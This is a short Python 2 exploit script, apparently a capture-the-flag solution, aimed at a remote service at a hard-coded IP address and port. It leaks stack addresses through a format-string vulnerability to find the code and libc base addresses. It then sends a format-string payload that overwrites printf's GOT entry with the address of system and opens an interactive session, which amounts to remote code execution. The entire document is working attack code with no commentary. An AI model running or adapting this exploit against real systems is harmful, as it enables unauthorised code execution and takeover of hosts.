#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.16"
#port = 8888
host = "202.120.7.152"
port = 9995

sock = make_conn(host,port)

recvuntil(sock,":")
sendline(sock,"%29$p")
data = recvuntil(sock,":")
codebase =  int(data.split("\n")[0].strip(),16) - 0x2000
print "codebase : " +  hex(codebase)
printf_got = codebase + 0x2014
sendline(sock,"%43$p")
data = recvuntil(sock,":")
libcbase = int(data.split("\n")[0].strip(),16) - 243 - 0x19990
print hex(libcbase)
#system = libcbase + 0x3fcd0
system = libcbase + 0x40190


payload = pack32(printf_got)
payload += pack32(printf_got+1)
payload += pack32(printf_got+2)
payload += pack32(printf_got+3)

prev = 16
for i in range(4):
    now = (system >> i*8) & 0xff
    payload += fmtchar(prev,now,7+i)
    prev = now

sendline(sock,payload)
inter(sock)
